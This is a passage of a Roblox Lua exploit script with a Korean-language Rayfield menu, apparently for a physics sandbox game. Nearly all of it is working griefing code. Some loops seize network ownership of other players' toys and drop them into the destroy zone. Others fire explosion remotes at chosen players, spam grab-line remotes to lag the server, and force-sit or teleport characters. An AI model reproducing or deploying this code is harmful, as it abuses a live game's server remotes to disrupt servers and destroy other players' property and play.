                if folder:IsA("Folder") and folder.Name:match("SpawnedInToys") then
                    if folder.Name ~= (plr.Name .. "SpawnedInToys") then
                        for _, item in ipairs(folder:GetChildren()) do
                            if table.find(targetNames, item.Name) and item:FindFirstChild("SoundPart") then
                                local Spart = item.SoundPart

                                local basePart = item.PrimaryPart or Spart
                                local PartOwner = item:FindFirstChild("PartOwner")
                                local dist = (basePart.Position - hrp.Position).Magnitude

                                if dist <= 30 and not PartOwner then
                                    pcall(function()
                                        rs.GrabEvents.SetNetworkOwner:FireServer(Spart, lookAt(hrp.Position, Spart.Position))
                                    end)
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end

function AntiBoxF()
    local targetNames = {"Boombox"}

    task.spawn(function()
        while AntiBoxT and task.wait(0.1) do
            local character = plr.Character
            if not character then continue end

            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            for _, folder in ipairs(workspace:GetChildren()) do
                if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") then
                    if folder.Name ~= (plr.Name .. "SpawnedInToys") then
                        for _, item in ipairs(folder:GetChildren()) do
                            if table.find(targetNames, item.Name) and item:FindFirstChild("SoundPart") then
                                local Spart = item.Button

                                local basePart = item.PrimaryPart or Spart
                                local PartOwner = Spart:FindFirstChild("PartOwner")
                                local dist = (basePart.Position - hrp.Position).Magnitude

                                FallenY = workspace.FallenPartsDestroyHeight
                                targetY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -100

                                if dist <= 30 and not PartOwner then rs.GrabEvents.SetNetworkOwner:FireServer(Spart, CFrame.lookAt(hrp.Position, Spart.Position)) end
                                if PartOwner then Spart.CFrame = CFrame.new(0, targetY, 9999) end
                            end
                        end
                    end
                end
            end
        end
    end)
end
function AntiJukeboxF()
    local targetNames = {"JukeboxOrange", "JukeboxBule"}

    task.spawn(function()
        while _G.AntiJukeboxT and task.wait(0.1) do
            local character = plr.Character
            if not character then continue end

            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            for _, folder in ipairs(workspace:GetChildren()) do
                if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") then
                    if folder.Name ~= (plr.Name .. "SpawnedInToys") then
                        for _, item in ipairs(folder:GetChildren()) do
                            if table.find(targetNames, item.Name) then
                                local Spart = item:FindFirstChild("Button") or item:FindFirstChild("SoundPart") or item.PrimaryPart
                                if not Spart then continue end

                                local basePart = item.PrimaryPart or Spart
                                local PartOwner = Spart:FindFirstChild("PartOwner")
                                local dist = (basePart.Position - hrp.Position).Magnitude

                                if dist <= 30 and not PartOwner then 
                                    rs.GrabEvents.SetNetworkOwner:FireServer(Spart, CFrame.lookAt(hrp.Position, Spart.Position)) 
                                end
                                if PartOwner then 
                                    -- 고정 풀기 및 낙사 구역 밑바닥으로 처박아 강제 삭제 유도
                                    local FallenY = workspace.FallenPartsDestroyHeight
                                    local killY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -200
                                    
                                    if Spart:IsA("BasePart") then
                                        Spart.Velocity = Vector3.new(0, 0, 0)
                                        Spart.RotVelocity = Vector3.new(0, 0, 0)
                                    end
                                    Spart.CFrame = CFrame.new(0, killY, 0)
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end

function AntiPalletF()
    local targetNames = {"PalletLightBrown"}

    task.spawn(function()
        while _G.AntiPalletT and task.wait(0.1) do
            local character = plr.Character
            if not character then continue end

            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            for _, folder in ipairs(workspace:GetChildren()) do
                if folder:IsA("Folder") and folder.Name:match("SpawnedInToys$") then
                    if folder.Name ~= (plr.Name .. "SpawnedInToys") then
                        for _, item in ipairs(folder:GetChildren()) do
                            if table.find(targetNames, item.Name) then
                                local Spart = item:FindFirstChild("Button") or item.PrimaryPart
                                if not Spart then continue end

                                local basePart = item.PrimaryPart or Spart
                                local PartOwner = Spart:FindFirstChild("PartOwner")
                                local dist = (basePart.Position - hrp.Position).Magnitude

                                if dist <= 30 and not PartOwner then 
                                    rs.GrabEvents.SetNetworkOwner:FireServer(Spart, CFrame.lookAt(hrp.Position, Spart.Position)) 
                                end
                                if PartOwner then 
                                    -- 고정 풀기 및 낙사 구역 밑바닥으로 처박아 강제 삭제 유도
                                    local FallenY = workspace.FallenPartsDestroyHeight
                                    local killY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -200
                                    
                                    if Spart:IsA("BasePart") then
                                        Spart.Velocity = Vector3.new(0, 0, 0)
                                        Spart.RotVelocity = Vector3.new(0, 0, 0)
                                    end
                                    Spart.CFrame = CFrame.new(0, killY, 0)
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end

local AntiDeathConnection = nil



function AutoSitF()
    if currentConnection then
        currentConnection:Disconnect()
        currentConnection = nil
    end

    if not AutoSitT then return end

    currentConnection = RunService.Heartbeat:Connect(function()
        local char = plr.Character
        if not char or not char:FindFirstChild("Humanoid") or not char:FindFirstChild("HumanoidRootPart") then
            return
        end

        local hum = char.Humanoid
        local root = char.HumanoidRootPart

        if hum.SeatPart ~= nil and hum.Sit == true then
            return
        end

        if BLOBSIT then
            return
        end

        local allSeats = {}

        local myInv = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
        if myInv then
            for _, item in pairs(myInv:GetChildren()) do
                if item.Name == "CreatureBlobman" then
                    local seat = item:FindFirstChild("VehicleSeat")
                    if seat then
                        table.insert(allSeats, {
                            seat = seat,
                            isMine = true,
                            occupant = seat.Occupant
                        })
                    end
                end
            end
        end

        for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
            if otherPlayer ~= plr then
                local otherInv = workspace:FindFirstChild(otherPlayer.Name.."SpawnedInToys")
                if otherInv then
                    for _, item in pairs(otherInv:GetChildren()) do
                        if item.Name == "CreatureBlobman" then
                            local seat = item:FindFirstChild("VehicleSeat")
                            if seat and seat.Occupant == nil then
                                table.insert(allSeats, {
                                    seat = seat,
                                    isMine = false,
                                    owner = otherPlayer,
                                    occupant = nil
                                })
                            end
                        end
                    end
                end
            end
        end

        local targetSeat = nil
        local seatType = nil

        for _, seatInfo in ipairs(allSeats) do
            if seatInfo.isMine and seatInfo.occupant == nil then
                targetSeat = seatInfo.seat
                seatType = "myEmpty"
                break
            end
        end

        if not targetSeat then
            for _, seatInfo in ipairs(allSeats) do
                if seatInfo.isMine and seatInfo.occupant ~= nil then
                    targetSeat = seatInfo.seat
                    seatType = "myOccupied"
                    break
                end
            end
        end

        if not targetSeat then
            for _, seatInfo in ipairs(allSeats) do
                if not seatInfo.isMine then
                    targetSeat = seatInfo.seat
                    seatType = "otherEmpty"
                    break
                end
            end
        end

        if not targetSeat then
            if #allSeats == 0 then
                task.spawn(function()
                    rs:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction"):InvokeServer(
                        "CreatureBlobman",
                        root.CFrame * CFrame.new(0, 0, 20),
                        Vector3.new(0, 0, 0)
                    )
                end)
            end
            return
        end

        local seat = targetSeat
        local dist = (root.Position - seat.Position).Magnitude
        local _, onScreen = Camera:WorldToViewportPoint(seat.Position)
        
        if dist > 20 then
            root.CFrame = CFrame.new(seat.Position + Vector3.new(0, 3, 0))
        elseif dist > 10 or not onScreen then
            if hum.Sit then 
                hum.Sit = false 
            end
            seat:Sit(hum)
        else
            local prompt = seat:FindFirstChild("ProximityPrompt")
            if prompt then
                if hum.Sit then hum.Sit = false end
                if hum then rs.CharacterEvents.Struggle:FireServer() end
                fireproximityprompt(prompt)
            else
                seat:Sit(hum)
            end
        end
    end)
end

function AntiBananaF()
    local dropPos = CFrame.new(0, -999999999, 0)
    local dropVec = Vector3.new(0, -999999999, 0)
    local plr = game.Players.LocalPlayer

    local targetItemsDict = {
        ["CupMugWhite"] = true, ["CupMugBrown"] = true, ["FoodBanana"] = true, 
        ["FoodBread"] = true, ["FoodBroccoli"] = true, ["FoodCakePink"] = true, 
        ["FoodCoconut"] = true, ["FoodDippyEgg"] = true, ["FoodDonut"] = true, 
        ["FoodFrenchFries"] = true, ["FoodHamburger"] = true, ["FoodHotdog"] = true, 
        ["FoodMayonnaise"] = true, ["FoodMeatStick"] = true, ["FoodMushroomPoison"] = true, 
        ["FoodPizzaCheese"] = true, ["FoodPizzaPepperoni"] = true, ["FoodSodaCan"] = true, 
        ["PoopPile"] = true, ["PoopPileSparkle"] = true, ["InstrumentBrassBugle"] = true, 
        ["InstrumentBrassTrumpet"] = true, ["InstrumentDrumBongos"] = true, 
        ["InstrumentDrumSnare"] = true, ["InstrumentGuitarAcoustic"] = true, 
        ["InstrumentGuitarBanjo"] = true, ["InstrumentGuitarLyre"] = true, 
        ["InstrumentGuitarUkulele"] = true, ["InstrumentGuitarViolin"] = true, 
        ["InstrumentPianoKeyboard"] = true, ["InstrumentPianoMelodica"] = true, 
        ["InstrumentVoiceMicrophone"] = true, ["InstrumentWoodwindOcarina"] = true, 
        ["InstrumentWoodwindSaxophone"] = true, ["InstrumentBrassVuvuzela"] = true
    }

    local processedItems = {} 

    local function GetMyPlotNumber()
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return nil end

        for i = 1, 5 do
            local plot = plots:FindFirstChild("Plot" .. i)
            if plot then
                local plotSign = plot:FindFirstChild("PlotSign")
                if plotSign then
                    local owners = plotSign:FindFirstChild("ThisPlotsOwners")
                    if owners then
                        local ownerVal = owners:FindFirstChildOfClass("StringValue")
                        if ownerVal and ownerVal.Value == plr.Name then
                            return i
                        end
                    end
                end
            end
        end
        return nil
    end

    local function ProcessItem(item)
        if not item or not item.Parent then return end
        if processedItems[item] then return end

        local holdPart = item:FindFirstChild("HoldPart")
        if not holdPart then return end

        local holdRemote = holdPart:FindFirstChild("HoldItemRemoteFunction")
        local dropRemote = holdPart:FindFirstChild("DropItemRemoteFunction")

        if holdRemote and dropRemote then
            processedItems[item] = true

            task.spawn(function()
                local char = plr.Character
                if not char then 
                    processedItems[item] = nil 
                    return 
                end

                local success, err = pcall(function()
                    holdRemote:InvokeServer(item, char)
                    dropRemote:InvokeServer(item, dropPos, dropVec)
                end)

                if not success or item.Parent then
                    task.wait(1)
                    if item.Parent then
                        processedItems[item] = nil
                    end
                end
            end)
        end
    end

    while AntiBananaT do
        task.wait()

        local char = plr.Character
        if not char or not char.Parent then continue end

        local myPlotNumber = GetMyPlotNumber()
        local itemsToProcess = {}

        for _, player in ipairs(game.Players:GetPlayers()) do
            if player == plr then continue end

            if WhiteListMode then
                local isWhitelisted = false
                for _, whiteName in ipairs(Whitelist) do
                    if player.Name == whiteName then
                        isWhitelisted = true
                        break
                    end
                end
                if isWhitelisted then continue end
            end

            local folder = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
            if folder then
                for _, item in ipairs(folder:GetChildren()) do
                    if targetItemsDict[item.Name] then
                        table.insert(itemsToProcess, item)
                    end
                end
            end
        end

        local plotItems = workspace:FindFirstChild("PlotItems")
        if plotItems then
            for i = 1, 5 do
                if i == myPlotNumber then continue end
                local plot = plotItems:FindFirstChild("Plot" .. i)
                if plot then
                    for _, item in ipairs(plot:GetChildren()) do
                        if targetItemsDict[item.Name] then
                            table.insert(itemsToProcess, item)
                        end
                    end
                end
            end
        end

        for _, item in ipairs(itemsToProcess) do
            if not AntiBananaT then break end
            ProcessItem(item)
        end

        for item, _ in pairs(processedItems) do
            if not item.Parent then
                processedItems[item] = nil
            end
        end
    end
end

ifKickThenT = true
local anchoredCache = {}

function ifKickThenF()
    Players.PlayerAdded:Connect(function(plr)
        plr.CharacterAdded:Connect(function(char)
            local hrp = char:WaitForChild("HumanoidRootPart", 1)
            if hrp then
                anchoredCache[plr] = false
            end
        end)
    end)

    Players.PlayerRemoving:Connect(function(plr)
        if anchoredCache[plr] == true then
            local DISP = plr.DisplayName
            local NAP = plr.Name
            Rayfield:Notify({
                Title = "[ Kick ]", 
                Content = "[" .. DISP .. "] ( @" .. NAP ..  ")", 
                Duration = 7, 
                Image = 0
            })
        end
        anchoredCache[plr] = nil
    end)

    task.spawn(function()
        while ifKickThenT do
            for _, plr in ipairs(Players:GetPlayers()) do
                local char = plr.Character
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        anchoredCache[plr] = hrp.Anchored == true
                    end
                end
            end
            task.wait()
        end
    end)
end
ifKickThenF()

local mouse = plr:GetMouse()
function tpF()
    local char = plr.Character
    if not char then return end

    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local hum = char:FindFirstChild("Humanoid")
    local ragdolled = hum:FindFirstChild("Ragdolled")

    local target = mouse.Target
    if not target then return end

    local currentCFrame = hrp.CFrame
    local currentRotation = CFrame.new(Vector3.zero, currentCFrame.LookVector)

    local parts = {"Head", "Torso", "Left Leg", "Right Leg", "Left Arm", "Right Arm"}
    for _, name in ipairs(parts) do
        local part = char:FindFirstChild(name)
        if part and part:IsA("BasePart") then
            part.Transparency = 0
        end
    end

    for _, obj in ipairs(char:GetChildren()) do
        if obj:IsA("Accessory") and obj.Name ~= "TypingKeyboardMyWorld" then
            for _, v in ipairs(obj:GetChildren()) do
                if v:IsA("BasePart") then
                    v.Transparency = 0
                end
            end
        end
    end

    local mouseHit = mouse.Hit
    local targetPos = mouseHit.Position + Vector3.new(0, 5, 0)
    local newCFrame = CFrame.new(targetPos) * currentRotation

    if ragdolled.Value == true then
        char:PivotTo(newCFrame)
    else
        hrp.CFrame = newCFrame
    end
end

function AntiBlobUseF()
    task.spawn(function()
        local FallenY = workspace.FallenPartsDestroyHeight
        local targetY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -100
        local dropPos = CFrame.new(0, targetY, 9999)
        local plr = game.Players.LocalPlayer
        local targetItems = {"CreatureBlobman", "TractorRed", "TractorOrange", "TractorGreen", "SantaSleigh"}

        local processedBlobs = {}
        local cleanupInterval = 2

        while AntiBlobUseT do
            task.wait(0.01)

            local char = plr.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChildOfClass("Humanoid")

            if not char or not root or not hum then continue end

            local myPlotNumber = nil
            local plots = workspace:FindFirstChild("Plots")
            if plots then
                for i = 1, 5 do
                    local plot = plots:FindFirstChild("Plot" .. i)
                    local plotSign = plot and plot:FindFirstChild("PlotSign")
                    local owners = plotSign and plotSign:FindFirstChild("ThisPlotsOwners")
                    local ownerVal = owners and owners:FindFirstChildOfClass("StringValue")
                    if ownerVal and ownerVal.Value == plr.Name then
                        myPlotNumber = i
                        break
                    end
                end
            end

            local function collectItemsFromFolder(folder)
                local items = {}
                for _, item in ipairs(folder:GetChildren()) do
                    if item:IsA("Model") and table.find(targetItems, item.Name) then
                        if item:FindFirstChild("VehicleSeat") then
                            local vs = item:FindFirstChildOfClass("VehicleSeat")
                            if vs and vs.Occupant then 
                                if vs.Occupant == hum then
                                    table.insert(items, item)
                                end
                                continue 
                            end

                            local itemId = tostring(item:GetDebugId())
                            if not processedBlobs[itemId] then
                                table.insert(items, item)
                            end
                        end
                    end
                end
                return items
            end

            local allItems = {}
            for _, player in ipairs(game.Players:GetPlayers()) do
                if player == plr then continue end
                if WhiteListMode then
                    local inWhitelist = false
                    for _, whiteName in ipairs(Whitelist) do 
                        if player.Name == whiteName then 
                            inWhitelist = true 
                            break 
                        end 
                    end
                    if inWhitelist then continue end
                end
                local folder = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
                if folder then 
                    for _, item in ipairs(collectItemsFromFolder(folder)) do 
                        table.insert(allItems, item) 
                    end 
                end
            end

            local plotItems = workspace:FindFirstChild("PlotItems")
            if plotItems then
                for i = 1, 5 do
                    if i == myPlotNumber then continue end
                    local plot = plotItems:FindFirstChild("Plot" .. i)
                    if plot then 
                        for _, item in ipairs(collectItemsFromFolder(plot)) do 
                            table.insert(allItems, item) 
                        end 
                    end
                end
            end

            for _, item in ipairs(allItems) do
                if not AntiBlobUseT then break end

                local itemId = tostring(item:GetDebugId())

                if processedBlobs[itemId] then
                    continue
                end

                local char = plr.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                local hum = char and char:FindFirstChildOfClass("Humanoid")

                if not char or not root or not hum then break end

                local vs = item:FindFirstChildOfClass("VehicleSeat")

                if vs then
                    if vs.Occupant and vs.Occupant ~= hum then 
                        continue 
                    end

                    root.Anchored = true
                    vs:Sit(hum)

                    if hum and vs then
                    task.wait(0.1)
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                    task.wait()
                    if item.PrimaryPart then item:SetPrimaryPartCFrame(dropPos) end
                    root.Anchored = false

                        if root and vs then
                            local connection
                            connection = vs.AncestryChanged:Connect(function()
                                if not vs or not vs.Parent then
                                    if connection then
                                        connection:Disconnect()
                                    end
                                    processedBlobs[itemId] = true

                                    task.delay(cleanupInterval, function()
                                        processedBlobs[itemId] = nil
                                    end)
                                end
                            end)

                            task.delay(2, function()
                                if connection then
                                    connection:Disconnect()
                                end
                                processedBlobs[itemId] = true

                                task.delay(cleanupInterval, function()
                                    processedBlobs[itemId] = nil
                                end)
                            end)
                        end
                    end

                    task.wait(0.0001)
                end

                break
            end
        end
    end)
end

local TARGET_INDEX = 1

local Remotes = {
    Spawn = rs:FindFirstChild("MenuToys"):FindFirstChild("SpawnToyRemoteFunction"),
    SetOwner = rs:FindFirstChild("GrabEvents"):FindFirstChild("SetNetworkOwner"),
    Extend = rs:FindFirstChild("GrabEvents"):FindFirstChild("ExtendGrabLine"),
    Explode = rs:FindFirstChild("BombEvents"):FindFirstChild("BombExplode")
}

function LoopSnowBallF()
    if SnowballLoopThread and coroutine.status(SnowballLoopThread) ~= "dead" then
        return
    end

    if not playersInLoop1V or type(playersInLoop1V) ~= "table" then
        playersInLoop1V = {}
    end

    SnowballLoopThread = coroutine.create(function()
        while LoopSnowBallT do
            task.wait(0.2)

            local myHrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if not myHrp then
                continue
            end

            local ball = inv:FindFirstChild("BallSnowball")
            if not ball then
                task.spawn(function()
                    Remotes.Spawn:InvokeServer("BallSnowball", myHrp.CFrame * CFrame.new(0, 10, 20), Vector3.new(0, 0, 0))
                end)
                task.wait(0.15)
                continue
            end

            if #playersInLoop1V == 0 then
                task.wait(0.1)
                continue
            end

            TARGET_INDEX = TARGET_INDEX > #playersInLoop1V and 1 or TARGET_INDEX
            local targetName = playersInLoop1V[TARGET_INDEX]
            local targetPlayer = game.Players:FindFirstChild(targetName)

            if not targetPlayer or targetPlayer == plr or not targetPlayer.Character then
                table.remove(playersInLoop1V, TARGET_INDEX)
                if TARGET_INDEX > #playersInLoop1V then
                    TARGET_INDEX = 1
                end
                continue
            end

            local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if not targetHrp then
                table.remove(playersInLoop1V, TARGET_INDEX)
                if TARGET_INDEX > #playersInLoop1V then
                    TARGET_INDEX = 1
                end
                continue
            end

            TARGET_INDEX = TARGET_INDEX + 1
            if TARGET_INDEX > #playersInLoop1V then
                TARGET_INDEX = 1
            end

            local ballSPart = ball:FindFirstChild("SoundPart")
            if not ballSPart then
                task.wait(0.1)
                continue
            end

            Remotes.SetOwner:FireServer(ballSPart, ballSPart.CFrame)
            task.wait(0.05)
            ballSPart.CFrame = targetHrp.CFrame

            task.wait(0.05)
            Remotes.Explode:FireServer({
                Radius = 0, 
                Color = Color3.new(0, 0, 0), 
                TimeLength = 0, 
                Model = ball, 
                Type = "SnowPoof", 
                ExplodesByFire = false, 
                MaxForcePerStudSquared = 0, 
                Hitbox = ballSPart, 
                ImpactSpeed = 0, 
                ExplodesByPointy = false, 
                DestroysModel = true, 
                PositionPart = ballSPart
            }, Vector3.new(0, 0, 0))

            task.wait(0.15)
        end

        SnowballLoopThread = nil
    end)

    coroutine.resume(SnowballLoopThread)
end





LineLagV = 50
function LineLagF()
for i, e in game.Players:GetPlayers() do
if table.find(Whitelist, e.Name) then return end
end

while wait(0.5) and LineLagT do
for a = 0, LineLagV do
for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
if player.Character.Torso ~= nil then
rs.GrabEvents.CreateGrabLine:FireServer(player.Character.Torso, player.Character.Torso.CFrame)
end
end
end
end
end

----------------------------------------------------------------------------------------- [ 시작 설정 ]


local Players = game:GetService("Players")
local localPlayer = game.Players.LocalPlayer
local rs = game:GetService("ReplicatedStorage")

local GrabEvents = rs:FindFirstChild("GrabEvents")
local SetNetworkOwner = GrabEvents and GrabEvents:FindFirstChild("SetNetworkOwner")
local DestroyGrabLine = GrabEvents and GrabEvents:FindFirstChild("DestroyGrabLine")
local EndGrabEarly = GrabEvents and GrabEvents:FindFirstChild("EndGrabEarly")

local antiGrabActive = false
local antiGrabTargetList = {}
local antiGrabProcessing = {}
local antiGrabThreads = {}

local function processAntiGrabPlayer(player)
    if not player then return false end

    local myChar = localPlayer.Character
    local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
    local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
    if not myChar or not myHrp or not myHum or myHum.Health <= 0 then
        return false
    end

    local character = player.Character
    if not character then return false end
    local targetRoot = character:FindFirstChild("HumanoidRootPart")
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    local head = character:FindFirstChild("Head")
    if not targetRoot or not head or not torso then return false end

    local originCF = myHrp.CFrame

    local tpRunning = true
    local tpThread = task.spawn(function()
        while tpRunning do
            if not localPlayer.Character or not localPlayer.Character:FindFirstChild("HumanoidRootPart") or 
               (localPlayer.Character:FindFirstChildOfClass("Humanoid") and localPlayer.Character:FindFirstChildOfClass("Humanoid").Health <= 0) then
                break
            end

            local ok, cf = false, nil
            if typeof(TP) == "function" then
                ok, cf = TP(player)
                if ok and cf then
                    cf = cf * CFrame.new(0, -10, 0)
                end
            else
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    ok, cf = true, player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -10, 0)
                end
            end

            if ok and cf then
                myHrp.CFrame = cf
            end
            task.wait(0.01)
        end
    end)
    table.insert(antiGrabThreads, tpThread)

    local success = false
    local startTime = tick()
    local timeout = 0.1

    while tpRunning and tick() - startTime < timeout do
        if not localPlayer.Character or not localPlayer.Character:FindFirstChild("HumanoidRootPart") or 
           (localPlayer.Character:FindFirstChildOfClass("Humanoid") and localPlayer.Character:FindFirstChildOfClass("Humanoid").Health <= 0) then
            break
        end

        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") or 
           (player.Character:FindFirstChildOfClass("Humanoid") and player.Character:FindFirstChildOfClass("Humanoid").Health <= 0) then
            break
        end

        if SetNetworkOwner and SetNetworkOwner.FireServer then
            SetNetworkOwner:FireServer(torso, targetRoot.CFrame)
        end
        
        if DestroyGrabLine and DestroyGrabLine.FireServer then
            DestroyGrabLine:FireServer(character)
            DestroyGrabLine:FireServer(torso)
        end

        if EndGrabEarly and EndGrabEarly.FireServer then
            EndGrabEarly:FireServer()
        end

        local ownerTag = head:FindFirstChild("PartOwner")
        if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == localPlayer.Name then
            success = true
            break
        end
        task.wait(0.02)
    end

    tpRunning = false

    for _, thread in ipairs(antiGrabThreads) do
        if thread then
            pcall(task.cancel, thread)
        end
    end
    table.clear(antiGrabThreads)

    if success then
        pcall(function()
            for _, v in ipairs(character:GetDescendants()) do
                if v:IsA("Weld") or v:IsA("WeldConstraint") or v:IsA("AlignPosition") or v:IsA("AlignOrientation") or v:IsA("TouchTransmitter") then
                    v:Destroy()
                end
            end
            for _, v in ipairs(myChar:GetDescendants()) do
                if v:IsA("Weld") or v:IsA("WeldConstraint") or v:IsA("AlignPosition") or v:IsA("AlignOrientation") then
                    if v.Part0 == torso or v.Part1 == torso or v.Part0 == targetRoot or v.Part1 == targetRoot then
                        v:Destroy()
                    end
                end
            end
        end)
    end

    if originCF and myHrp and myHrp.Parent then
        myHrp.CFrame = originCF
        task.wait(0.5)
    end

    if originCF and myHrp and myHrp.Parent then 
        if typeof(BACK) == "function" then
            BACK(originCF)
        else
            myHrp.CFrame = originCF
        end
    end

    if myHum and myHum.Parent then
        myHum:ChangeState(Enum.HumanoidStateType.GettingUp)
    end
    
    return success
end

local antiGrabDropdown = FDTab:CreateDropdown({
    Name = "보호할 사람고르기  <font color='rgb(0,0,255)'>[다수]</font>",
    Options = {},
    CurrentOption = {},
    MultipleOptions = true,
    Flag = "AntiGrabUniquePlayerList",
    Callback = function(Options)
        local selectedTable = {}
        if typeof(Options) == "table" then
            for k, v in pairs(Options) do
                if typeof(v) == "string" then
                    table.insert(selectedTable, v)
                elseif v == true and typeof(k) == "string" then
                    table.insert(selectedTable, k)
                elseif typeof(v) == "table" and typeof(v.Value) == "string" then
                    table.insert(selectedTable, v.Value)
                end
            end
        elseif typeof(Options) == "string" then
            table.insert(selectedTable, Options)
        end
        antiGrabTargetList = selectedTable
    end
})

local function refreshAntiGrabDropdown()
    local playerNames = {}
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= localPlayer then
            table.insert(playerNames, player.Name)
        end
    end
    antiGrabDropdown:Refresh(playerNames, true)
    
    local updatedOptions = {}
    local validList = {}
    for _, currentName in ipairs(antiGrabTargetList) do
        if game.Players:FindFirstChild(currentName) then
            table.insert(validList, currentName)
            updatedOptions[currentName] = true
        end
    end
    antiGrabTargetList = validList
    antiGrabDropdown:Set(updatedOptions)
end

game.Players.PlayerAdded:Connect(refreshAntiGrabDropdown)
game.Players.PlayerRemoving:Connect(refreshAntiGrabDropdown)
refreshAntiGrabDropdown()

task.spawn(function()
    while true do
        if antiGrabActive then
            local myChar = localPlayer.Character
            local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
            if myChar and myHum and myHum.Health > 0 then
                for i = 1, #antiGrabTargetList do
                    local name = antiGrabTargetList[i]
                    local player = game.Players:FindFirstChild(name)
                    if player and not table.find(Whitelist, player.Name) then
                        local character = player.Character
                        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                        local head = character and character:FindFirstChild("Head")

                        if not PPs:FindFirstChild(name) and not inv:FindFirstChild(name) then
                            if humanoid and humanoid.Health > 0 and head then
                                local ownerTag = head:FindFirstChild("PartOwner")
                                if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value ~= "" and ownerTag.Value ~= localPlayer.Name then
                                    if not antiGrabProcessing[player] then
                                        antiGrabProcessing[player] = true
                                        
                                        task.spawn(function()
                                            processAntiGrabPlayer(player)
                                            task.wait(0.5)
                                            antiGrabProcessing[player] = nil
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.03)
    end
end)

FDTab:CreateInput({
    Name = "보호 대상 추가 (닉네임 입력)   <font color='rgb(0,0,255)'>[한명]</font>",
    PlaceholderText = "플레이어 이름 입력",
    RemoveTextAfterFocusLost = true,
    Callback = function(Text)
        if Text == "" or Text == nil then return end
        
        local foundPlayer = nil
        local searchPattern = Text:lower()
        
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p ~= localPlayer then
                local nameMatch = p.Name:lower():sub(1, #searchPattern) == searchPattern
                local displayMatch = p.DisplayName:lower():sub(1, #searchPattern) == searchPattern
                
                if nameMatch or displayMatch then
                    foundPlayer = p
                    break
                end
            end
        end

        if foundPlayer then
            if not table.find(antiGrabTargetList, foundPlayer.Name) then
                table.insert(antiGrabTargetList, foundPlayer.Name)
                
                if Rayfield then
                    Rayfield:Notify({
                        Title = "[ ☑️ ]",
                        Content = foundPlayer.Name .. " - 추가",
                        Duration = 2
                    })
                end
                
                local updatedOptions = {}
                for _, currentName in ipairs(antiGrabTargetList) do
                    updatedOptions[currentName] = true
                end
                antiGrabDropdown:Set(updatedOptions)
            else
                if Rayfield then
                    Rayfield:Notify({
                        Title = "[ 💠 ]",
                        Content = foundPlayer.Name .. " - 이미 추가됐어요",
                        Duration = 2
                    })
                end
            end
        else
            if Rayfield then
                Rayfield:Notify({
                    Title = "[ ❌ ]",
                    Content = "찾을 수 없어요!",
                    Duration = 2
                })
            end
        end
    end
})

FDTab:CreateToggle({
    Name = "보호 시스템 활성화   <font color='rgb(255,0,0)'>[오너쉽]</font>",
    CurrentValue = false,
    Flag = "AntiGrabUniqueSystemToggle",
    Callback = function(Value)
        antiGrabActive = Value
        
        local myChar = localPlayer.Character
        local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
        
        if Value then
            if myHum then
                myHum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                myHum.Sit = false
                myHum.PlatformStand = false
                myHum:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
        else
            table.clear(antiGrabProcessing)
            if myHum then
                myHum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            end
        end
    end
})



-- ================== [ 유틸리티 기능 ] ==================

UtilityTab:CreateSection("환경 및 시야")

-- 1. 줌 제한 해제
UtilityTab:CreateButton({
    Name = "최대 줌 거리 무제한",
    Callback = function()
        pcall(function()
            plr.CameraMaxZoomDistance = 100000000000000000000000000000000000000
        end)
    end,
})

-- 2. 안개 제거
UtilityTab:CreateButton({
    Name = "맵 안개 제거",
    Callback = function()
        pcall(function()
            game:GetService("Lighting").FogEnd = 9e9
        end)
    end,
})

-- 3. 시간대 변경 (낮)
UtilityTab:CreateButton({
    Name = "서버 시간 낮으로 고정",
    Callback = function()
        pcall(function()
            game:GetService("Lighting").ClockTime = 14
        end)
    end,
})

UtilityTab:CreateSection("캐릭터 비주얼")

-- 4. 캐릭터 반투명화
UtilityTab:CreateToggle({
    Name = "유령 모드 (반투명)",
    CurrentValue = false,
    Callback = function(Value)
        pcall(function()
            local char = plr.Character
            if char then
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
                        v.Transparency = Value and 0.5 or 0
                    end
                end
